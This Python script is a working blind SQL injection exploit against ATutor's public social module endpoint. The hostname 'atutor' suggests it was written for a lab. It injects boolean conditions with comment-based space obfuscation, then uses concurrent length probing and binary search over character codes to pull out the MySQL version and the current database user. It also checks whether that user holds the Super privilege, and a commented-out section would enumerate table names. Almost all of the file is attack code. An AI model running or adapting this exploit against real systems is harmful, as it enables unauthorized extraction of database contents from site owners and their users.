import asyncio
from urllib import response
from collections.abc import Callable
import aiohttp
from typing import List, Iterable
try:
    import uvloop
    uvloop.install()
except:
    pass

SQL_URL = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
LOGIN_URL = "http://atutor/ATutor/login.php"
COMMENT="%23"
#sqli = lambda url, query, comment: F"{url}test') OR ({query}){comment}".replace(' ','/**/')
blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
blind_sqli_falsy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=2,({sub_query}),1)){comment}"

QUERIES = {
    'DB_VERSION': "select version()",
    'STR_EXFIL': lambda sub_query,position, mid: F"ascii(substring(({sub_query}),{position},1))>{mid}", 
    'LENGTH_EXFIL': lambda sub_query,i: F"select length(({sub_query}))={i}",
    'COUNT_EXFIL': lambda sub_query,i: F"SELECT ({sub_query})={i}",
    'CURRENT_USER_IS_DB_ADMIN' : lambda username:  F"SELECT(SELECT COUNT(*) FROM mysql.user WHERE Super_priv ='Y' AND current_user='{username}')>1",
}

async def run_until_found(tasklist: List):
    """Run all generated tasks until value is returned, cancel the rest"""
    tasks = asyncio.as_completed(tasklist)

    for future in tasks:
        response = await future
        if response:
            break
    map(lambda x: x.cancel(), tasks)
    return response
# here we specify the condition that lets us infer the result of a query from the response 
def response_truth_condition(response): 
    content_length = int(response.headers['Content-Length'])
    # in burp the content length is 246 but here it's 180, idk why
    # the error condition response content length is 20 so our truth condition could be content_length > 20 but i prefer to be exact
    if (content_length == 180):
        return True
    return False
async def blind_query(session:aiohttp.client.ClientSession,  truth_condition,
                      ip:str, sub_query:str, ordinal:str = "",
                      query_encoder:Callable[[str], str]=None, debug:bool=False
                      ):
    target = query_encoder(blind_sqli_truthy(ip,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(ip, sub_query, COMMENT)
    try:
        async with session.get(target) as res:
            if debug == True:
                print("target: ", target)
                print("response headers: ", res.headers)
                print("response: ", res.content)
            if (truth_condition(res)):
                return ordinal if ordinal else True
            return False
    except aiohttp.client_exceptions.ServerDisconnectedError:
        return False
async def blind_query_binary_search(session:aiohttp.client.ClientSession,  truth_condition,
                      ip:str, sub_query:str, sub_query_cmp_value:str = "",
                      query_encoder:Callable[[str], str]=None, debug:bool=False
                      ):
    target = query_encoder(blind_sqli_truthy(ip,sub_query, COMMENT)) if query_encoder else blind_sqli_truthy(ip, sub_query, COMMENT)
    try:
        async with session.get(target) as res:
            if debug == True:
                print("target: ", target)
                print("response headers: ", res.headers)
                print("response: ", res.content)
            if (truth_condition(res)):
                return sub_query_cmp_value if sub_query_cmp_value else True
            return False
    except aiohttp.client_exceptions.ServerDisconnectedError:
        return False   
async def question(sub_query: str, query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        return await blind_query(session, response_truth_condition, SQL_URL, sub_query, query_encoder=query_encoder)
async def get_length(sub_query: str, lower_bound: int = 1, upper_bound: int = 65, query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        cr_length = [
            blind_query(session, response_truth_condition, SQL_URL, QUERIES['LENGTH_EXFIL'](sub_query,i), str(i), query_encoder=query_encoder)
            for i in range(lower_bound, upper_bound)
        ]
        strlen = int(await run_until_found(cr_length))
        try:
            return strlen
        except:
            print(F"(+) Could not determine length of subquery [{sub_query}].")
            exit(1)
async def get_count(sub_query: str,lower_bound: int = 0, upper_bound: int = 1000,query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        cr_count = [
            blind_query(session, response_truth_condition, SQL_URL, QUERIES['COUNT_EXFIL'](sub_query,i), str(i), query_encoder=query_encoder)
            for i in range(lower_bound, upper_bound)
        ]
        count = int(await run_until_found(cr_count))
        try:
            return count
        except:
            print(F"(+) Could not determine count of subquery [{sub_query}].")
            exit(1)
async def binary_search(session:aiohttp.client.ClientSession, lo, hi, sub_query, position, query_encoder:Callable[[str], str]=None):
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        res = await blind_query(session, response_truth_condition, SQL_URL, QUERIES['STR_EXFIL'](sub_query,position,mid), mid, query_encoder=query_encoder)
        if (res):
            lo = mid + 1
        else:
            hi = mid - 1
    return lo
async def get_string(sub_query:str, strlen: int, query_encoder:Callable[[str], str]=None):
    async with aiohttp.ClientSession() as session:
        tasks = [
            binary_search(session, 32,126, sub_query, i, query_encoder=query_encoder)
            for i in range(1, strlen+1)
        ]
        s = list(await asyncio.gather(*tasks))
        s = [chr(c) for c in s]
        s = "".join(s)
        try:
            return s
        except:
            print(F"(+) Could not exfil string with subquery [{sub_query}].")
            exit(1)
async def report(query_encoder:Callable[[str], str]=None):
    version_strlen = await get_length("select version()", query_encoder=query_encoder)
    print("(+) DB Version strlen: ", version_strlen)
    print(F"(+) MySQL Version: {await get_string('select version()', version_strlen, query_encoder=query_encoder)}")
    db_user_strlen = await get_length("select current_user()", query_encoder=query_encoder)
    print("(+) Current DB User strlen: ", db_user_strlen)
    db_user = await  get_string("select current_user()", db_user_strlen, query_encoder=query_encoder)
    print(F"(+) Current DB User: {db_user}")
    print(F"(+) Current User is DB Admin?: {await question(QUERIES['CURRENT_USER_IS_DB_ADMIN'](db_user), query_encoder=query_encoder)}")
    '''
    num_tables = await get_count("SELECT COUNT(table_name) FROM information_schema.tables")
    print(num_tables)
    table_name_lengths = []
    tables = []
    for i in range (0, num_tables):
        table_name_lengths.append(await get_length(F"SELECT table_name FROM information_schema.tables LIMIT {i},1"))
        print(i, ":", table_name_lengths[i])
        tables.append(await get_string(F"SELECT table_name FROM information_schema.tables LIMIT {i},1", table_name_lengths[i]))
        print(tables[i], ":", table_name_lengths[i])
    '''
try:
    asyncio.run(report(lambda s: s.replace(' ','/**/')))
# https://github.com/MagicStack/uvloop/issues/349
except NotImplementedError:
    pass